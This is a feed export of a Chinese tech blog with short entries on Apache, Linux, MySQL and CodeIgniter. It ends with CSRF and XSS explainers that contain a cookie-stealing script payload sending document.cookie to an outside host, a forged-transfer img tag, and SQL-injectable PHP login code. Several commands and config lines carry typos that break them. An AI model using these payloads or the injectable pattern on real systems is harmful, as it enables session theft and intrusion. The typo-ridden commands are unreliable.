<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /lamp/httpd-2.2.9
</span><span class='line'>./configure --prefix=/usr/local/apache2/ \
</span><span class='line'>--sysconfdir=/usr/local/apache2/etc/ --with-included-apr \
</span><span class='line'>--enable-dav --enable-so --enable-defate=sharef \
</span><span class='line'>--enable-expries=shared --enable-rewrite=shared
</span><span class='line'>make 
</span><span class='line'>make install
</span><span class='line'>启动apache测试
</span><span class='line'>/usr/local/apache2/bin/apachectl restart
</span><span class='line'>查看进程
</span><span class='line'>ps -le |grep httpd
</span><span class='line'>查看apche模块
</span><span class='line'>/usr/local/apache2/bin/apachectl -h
</span><span class='line'>#share 动态模块或动态文件
</span><span class='line'>php5 rewrite
</span><span class='line'>#static 静态模块或表态库文件
</span><span class='line'>server-status
</span><span class='line'>userdir
</span><span class='line'>vitual host
</span><span class='line'>测试地址
</span><span class='line'>http://192.168.100.1/index.html
</span><span class='line'>设置apache随机启动
</span><span class='line'>vim /etc/rc.local
</span><span class='line'>/usr/local/apache2/bin/apachectl restart</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux之服务进程]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/09/linux002/"/>
    <updated>2015-07-09T16:48:16+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/09/linux002</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>ps  查看进程 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-A  显示所有进程
</span><span class='line'>-e  列出程序时，显示每个程序所使用的环境变量
</span><span class='line'>-f 全部列出，通常和其他选项连用
</span><span class='line'>ps -ef | gren httpd</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>pstree 查看进程树 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-p 显示所有的进程，包括进程名和进程ID
</span><span class='line'>pstree -p</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>netstat 查看端口 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-a  显示所有选项
</span><span class='line'>-t  仅显示tcp相关选项
</span><span class='line'>-u  仅显示udp相关选项
</span><span class='line'>-n  拒绝显示别名
</span><span class='line'>-p  显示建立相关链接的程序名
</span><span class='line'>netstat -tunp | gren httpd</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>top 查看服务器负载 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>top - 00:15:48 up 1:23, 2 users, load average:0.26,0.33,0.47
</span><span class='line'>当前时间  系统已运行的时间 当前登录用户的数量 最近5、10和15分钟内的平均负载</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>uptime 查看平均负载 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>13:22:30 up 8 min,  4 users,  load average: 0.14, 0.38, 0.25
</span><span class='line'>当前时间  系统运行时间  当前登录用户 三个数值分别为 1分钟 5分钟 15分钟前到现在的平均值</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux之权限管理]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/09/linux001/"/>
    <updated>2015-07-09T15:19:42+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/09/linux001</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>useradd 添加用户 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-u  指定用户uid
</span><span class='line'>-g  指定用户组
</span><span class='line'>-G  指定用户次用户组
</span><span class='line'>-d  指定用户的家目录</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>usermod 修改用户信息 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-u  修改用户uid
</span><span class='line'>-g  修改用户主用户组
</span><span class='line'>-G  修改用户次用户组
</span><span class='line'>-d  修改用户家目录
</span><span class='line'>-L  锁定用户
</span><span class='line'>-U  解锁用户</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>userdel 删除用户 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-r 删除用户的同时，一并把用户的家目录及本地邮件存储的目录或文件也一同删除</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>passwd 修改用户密码 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-d  删除密码（仅有管理员才能使用）
</span><span class='line'>-f  强制执行
</span><span class='line'>-l  锁定密码
</span><span class='line'>-u  解锁
</span><span class='line'>-s  列出密码的相关信息</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>chmod 变更文件或目录权限 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-R  递归处理
</span><span class='line'>chmod a+x -R ./newdri</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>setfacl 设置某个文件/目录的acl的权限 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-m  设置后续acl参数（setfacl -m u:code:r /test）
</span><span class='line'>-x  删除后续acl参数（setfacl -x u:code /test）
</span><span class='line'>-b  删除全部acl参数（setfacl -b u:code /test）</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>getfacl 查看某个文件/目录的acl的权限 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getfacl /test</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[apache基本介绍]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/09/apache002/"/>
    <updated>2015-07-09T14:31:18+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/09/apache002</id>
    <content type="html"><![CDATA[<h2>1.apache主目录</h2>

<p><code>ServerRoot &ldquo;/usr/local/apache2/&rdquo;</code></p>

<h2>2.监听端口</h2>

<p><code>Listen 80</code></p>

<h2>3.加载动态模块</h2>

<p><code>LoadModule php5_module</code></p>

<p><code>modules/libphp5.so</code></p>

<h2>4.决定了apache的进程执行者</h2>

<p><code>User daemon</code></p>

<p><code>Group daemon</code></p>

<h2>5.服务器域名</h2>

<p><code>ServerName 192.168.100.1:80</code></p>

<h2>6.网站根目录</h2>

<p><code>DocumentRoot &ldquo;/usr/local/apache2/htdocs&rdquo;</code></p>

<h2>7.设置网站跟目录的访问权限</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;Directory "/usr/locla/apache2/htdocs">
</span><span class='line'>  Options Indexes FollowSymLinks
</span><span class='line'>  AllowOverride None
</span><span class='line'>  Order allow,deny
</span><span class='line'>  Allow form all
</span><span class='line'>&lt;/Directory>
</span><span class='line'>注意：Indexes是限制是否显示目录列表
</span><span class='line'>    FollowSymLinks是限制是否能使用软链接（ln main /usr/local/apache2/htdocs/main）</span></code></pre></td></tr></table></div></figure>


<h2>8.设置目录默认首页</h2>

<p><code>DirectoryIndex index.html index.php</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[apache自带的ab压力测试工具用法详解]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/09/apache001/"/>
    <updated>2015-07-09T10:31:18+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/09/apache001</id>
    <content type="html"><![CDATA[<p><strong>ab是apache自带的一个很好用的压力测试工具，当安装完apache的时候，就可以在bin下面找到ab</strong></p>

<p><strong>我们可以模拟100个并发用户，对一个页面发送1000个请求</strong></p>

<p><code>./ab -n 1000 -c 100 <a href="http://www.baidu.com">http://www.baidu.com</a></code></p>

<p><strong>其中-n代表请求数，-c代表并发数</strong></p>

<figure class='code'><figcaption><span>返回结果 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Concurrency Level: 100 ##并发数
</span><span class='line'>Time taken for tests: 0.273 seconds  ##共使用了多少时间
</span><span class='line'>Conmplete requests:  1000  ##请求数
</span><span class='line'>Failed requests:  0  ## 失败请求
</span><span class='line'>Write errors:  0  
</span><span class='line'>Total transferred:  275000 ##总共传输字节数，包含http的头信息等</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[mysql开启慢查询日志及查询--windows]]></title>
    <link href="http://ztlblog.github.io/blog/2015/07/09/mysql001/"/>
    <updated>2015-07-09T09:49:15+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/07/09/mysql001</id>
    <content type="html"><![CDATA[<h2>1.慢查询有什么用？</h2>

<p>它能记录下所有执行超过long_query_time时间的sql语句，帮你找到执行慢的sql，方便我们对这些sql进行优化。</p>

<h2>2.如何开启慢查询</h2>

<p>首先我们先查看mysql服务器的慢查询状态是否开启，执行如下命令：</p>

<p><code>show variables like &lsquo;%quer%&rsquo;</code></p>

<p>我们可以看到当前log_slow_queries状态为OFF，说明当前并没有开启慢查询。</p>

<p>开启慢查询非常简单，操作如下：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>log-slow-queries="D:/wamp/bin/mysql/mysql5.5.24/log/mysql-slow.log'
</span><span class='line'>long_query_time=4
</span><span class='line'>log-queries-not-using-indexs</span></code></pre></td></tr></table></div></figure>


<p>log-slow-queries：代表mysql慢查询的日志存储目录</p>

<p>long_query_time：最长执行时间</p>

<p>log-queries-not-using-indexes：没有使用到索引的查询也将被记录在日志中</p>

<p><strong>配置好以后重启mysql服务</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[codeigniter之表单验证]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/29/ci001/"/>
    <updated>2015-06-29T10:01:02+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/29/ci001</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>html </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;form action="" method="POST" enctype="multipart/form-data">
</span><span class='line'>  &lt;table class="table">
</span><span class='line'>      &lt;tr >
</span><span class='line'>          &lt;td class="th" colspan="10">编辑文章&lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>标题&lt;/td>
</span><span class='line'>          &lt;td>&lt;input type="text" name="title" value="&lt;?php echo set_value('title') ?>"/>
</span><span class='line'>          &lt;?php echo form_error('title', '&lt;span>', '&lt;/span>') ?>
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>类型&lt;/td>
</span><span class='line'>          &lt;td>
</span><span class='line'>              &lt;input type="radio" name="type" value="0"&lt;?php echo set_radio('type', '0', TRUE) ?>/> 普通
</span><span class='line'>              &lt;input type="radio" name="type" value="1"&lt;?php echo set_radio('type', '1') ?>/> 热门
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>栏目&lt;/td>
</span><span class='line'>          &lt;td>
</span><span class='line'>              &lt;select name="cid" id="">
</span><span class='line'>                  &lt;option value="1"&lt;?php echo set_select('cid', '1', TRUE) ?>>情感&lt;/option>
</span><span class='line'>                  &lt;option value="2"&lt;?php echo set_select('cid', '2') ?>>生活&lt;/option>
</span><span class='line'>              &lt;/select>
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>缩略图&lt;/td>
</span><span class='line'>          &lt;td>
</span><span class='line'>              &lt;input type="file" />
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>摘要&lt;/td>
</span><span class='line'>          &lt;td>
</span><span class='line'>              &lt;textarea name="info" id="" style="width:550px;height:160px;">&lt;?php echo set_value('info') ?>&lt;/textarea>&lt;?php echo form_error('info', '&lt;span>', '&lt;/span>') ?>
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td>内容&lt;/td>
</span><span class='line'>          &lt;td>
</span><span class='line'>              &lt;textarea name="content" id="" style="width:550px;height:500px;">&lt;?php echo set_value('content') ?>&lt;/textarea>
</span><span class='line'>              &lt;?php echo form_error('content', '&lt;span>', '&lt;/span>') ?>
</span><span class='line'>          &lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>      &lt;tr>
</span><span class='line'>          &lt;td colspan="10">&lt;input type="submit" class="input_button" value="发布"/>&lt;/td>
</span><span class='line'>      &lt;/tr>
</span><span class='line'>  &lt;/table>
</span><span class='line'>  &lt;/form></span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public function send(){
</span><span class='line'>      //载入表单验证类
</span><span class='line'>      $this->load->library('form_validation');
</span><span class='line'>      //引入验证规则
</span><span class='line'>      $status = $this->form_validation->run('article');
</span><span class='line'>
</span><span class='line'>      if($status){
</span><span class='line'>          //文件上传------------------------
</span><span class='line'>          //配置
</span><span class='line'>          $config['upload_path'] = './uploads/';
</span><span class='line'>          $config['allowed_types'] = 'gif|jpg|png|jpeg';
</span><span class='line'>          $config['max_size'] = '10000';
</span><span class='line'>          $config['file_name'] = time() . mt_rand(1000,9999);
</span><span class='line'>
</span><span class='line'>          //载入上传类
</span><span class='line'>          $this->load->library('upload', $config);
</span><span class='line'>          //执行上传
</span><span class='line'>          $status = $this->upload->do_upload('thumb');
</span><span class='line'>      
</span><span class='line'>          $wrong = $this->upload->display_errors();
</span><span class='line'>
</span><span class='line'>          if($wrong){
</span><span class='line'>              error($wrong);
</span><span class='line'>          }
</span><span class='line'>          //返回信息
</span><span class='line'>          $info = $this->upload->data();
</span><span class='line'>
</span><span class='line'>          //缩略图-----------------
</span><span class='line'>          //配置
</span><span class='line'>          $arr['source_image'] = $info['full_path'];
</span><span class='line'>          $arr['create_thumb'] = FALSE;
</span><span class='line'>          $arr['maintain_ratio'] = TRUE;
</span><span class='line'>          $arr['width'] = 200;
</span><span class='line'>          $arr['height'] = 200;   
</span><span class='line'>
</span><span class='line'>          //载入缩略图类
</span><span class='line'>          $this->load->library('image_lib', $arr);
</span><span class='line'>          //执行动作
</span><span class='line'>          $status = $this->image_lib->resize();
</span><span class='line'>
</span><span class='line'>          if(!$status){
</span><span class='line'>              error('缩略图动作失败');
</span><span class='line'>          }
</span><span class='line'>
</span><span class='line'>          $this->load->model('article_model', 'art');
</span><span class='line'>
</span><span class='line'>          $data = array(
</span><span class='line'>              'title' => $this->input->post('title'),
</span><span class='line'>              'type'  => $this->input->post('type'),
</span><span class='line'>              'cid'   => $this->input->post('cid'),
</span><span class='line'>              'thumb' => $info['file_name'],
</span><span class='line'>              'info'  => $this->input->post('info'),
</span><span class='line'>              'content'=> $this->input->post('content'),
</span><span class='line'>              'time'  => time()
</span><span class='line'>              );  
</span><span class='line'>
</span><span class='line'>          $this->art->add($data);
</span><span class='line'>          success('admin/article/index', '发表成功');
</span><span class='line'>      }else {
</span><span class='line'>          $this->load->model('category_model', 'cate');
</span><span class='line'>          $data['category'] = $this->cate->check();
</span><span class='line'>          $this->load->helper('form');
</span><span class='line'>          $this->load->view('admin/article.html',$data);
</span><span class='line'>      }
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p><strong>注意:</strong>保存验证规则需要在application/config/文件夹下创建一个名称为form_validation.php的文件。然后将配置信息保存在数组$config中即可.</p>

<figure class='code'><figcaption><span>form_validation </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$config = array(
</span><span class='line'>  'article'   =>  array(
</span><span class='line'>          array(
</span><span class='line'>              'field' =>  'title',
</span><span class='line'>              'label' => '标题',
</span><span class='line'>              'rules' => 'required|min_length[5]'
</span><span class='line'>              ),
</span><span class='line'>          array(
</span><span class='line'>              'field' =>  'type',
</span><span class='line'>              'label' => '类型',
</span><span class='line'>              'rules' => 'required|integer'
</span><span class='line'>              ),
</span><span class='line'>          array(
</span><span class='line'>              'field' =>  'cid',
</span><span class='line'>              'label' => '栏目',
</span><span class='line'>              'rules' => 'integer'
</span><span class='line'>              ),
</span><span class='line'>          array(
</span><span class='line'>              'field' =>  'info',
</span><span class='line'>              'label' => '摘要',
</span><span class='line'>              'rules' => 'required|max_length[155]'
</span><span class='line'>              ),
</span><span class='line'>          array(
</span><span class='line'>              'field' =>  'content',
</span><span class='line'>              'label' => '内容',
</span><span class='line'>              'rules' => 'required|max_length[2000]'
</span><span class='line'>              )
</span><span class='line'>
</span><span class='line'>      ),
</span><span class='line'>  'cate'  => array(
</span><span class='line'>          array(
</span><span class='line'>              'field' => 'cname',
</span><span class='line'>              'label' => '栏目名称',
</span><span class='line'>              'rules' => 'required|max_length[20]'
</span><span class='line'>              ),
</span><span class='line'>
</span><span class='line'>      ),
</span><span class='line'>
</span><span class='line'>  );</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[csrf攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php004/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php004</id>
    <content type="html"><![CDATA[<h2>什么是csrf攻击</h2>

<p>csrf（cross-site request forgery）跨站请求伪造</p>

<h2>csrf的原理</h2>

<p><img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="tool-manager" /></p>

<h2>例如：</h2>

<p>银行网站A，它以get请求来完成银行转账的操作，<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100</a>
危险网站B，它里面有一段html的代码如下：
<code>&lt;img src='http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100'/&gt;</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xss攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php003/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php003</id>
    <content type="html"><![CDATA[<h2>什么是xss</h2>

<p>xss 表示cross site scripting（跨站脚本攻击）
一般分为两中类型
1：非持久型攻击
2：持久型攻击</p>

<h3>例如:</h3>

<figure class='code'><figcaption><span>非持久型 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>非持久型攻击是一次性的，仅对当前的页面访问产生影响
</span><span class='line'>$name = $_GET['name'];
</span><span class='line'>echo "welcome $name";
</span><span class='line'>echo "&lt;a href='http://www.baidu.com'>click to down&lt;/a>";
</span><span class='line'>攻击者可以通过下面url链接
</span><span class='line'>index.php?name=guest&lt;script>alert('test')&lt;/script>
</span><span class='line'>index.php?name=guest&lt;script>new Image().src="http://mytest.com/?"+document.cookie&lt;/script></span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>持久型 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
</span><span class='line'>$host = '192.168.1.8';
</span><span class='line'>$dbname = 'app';
</span><span class='line'>$user = 'yyy';
</span><span class='line'>$password = 'xxx';
</span><span class='line'>$schema = 'test';
</span><span class='line'>$conection_string = "host=$host dbname=$dbname user=$user password=$password";
</span><span class='line'>$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
</span><span class='line'>if(!Connect){
</span><span class='line'>  echo 'database connection failure';
</span><span class='line'>  exit;
</span><span class='line'>}
</span><span class='line'>$query = "select user_name,password from $schema.members where user_name'".$_POST['user_name']."'";
</span><span class='line'>$result = pg_query($connect,$query);
</span><span class='line'>$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
</span><span class='line'>$user_pass = md5($_POST['pass_word']);
</span><span class='line'>$user_name = $row['user_name'];
</span><span class='line'>if(strcmp($user_pass,$row['password']!=0)){
</span><span class='line'>  echo "Login failed";
</span><span class='line'>}else{
</span><span class='line'>  session_start();
</span><span class='line'>  $_SESSION['USER_NAME'] = $user_name;
</span><span class='line'>  echo "&lt;head>&lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\">&lt;/head>";
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h2>预防措施</h2>

<figure class='code'><figcaption><span>cookie </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
</span><span class='line'>setcookie(name,value,expire,path,domain,secure)
</span><span class='line'>name:cookie的名称 
</span><span class='line'>value：cookie的值
</span><span class='line'>expire：cookie的有效期
</span><span class='line'>path：cookie的服务器路径
</span><span class='line'>domain：cookie的域名
</span><span class='line'>secure：规定是否通过安全的https链接来传输cookie</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>输入检查 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
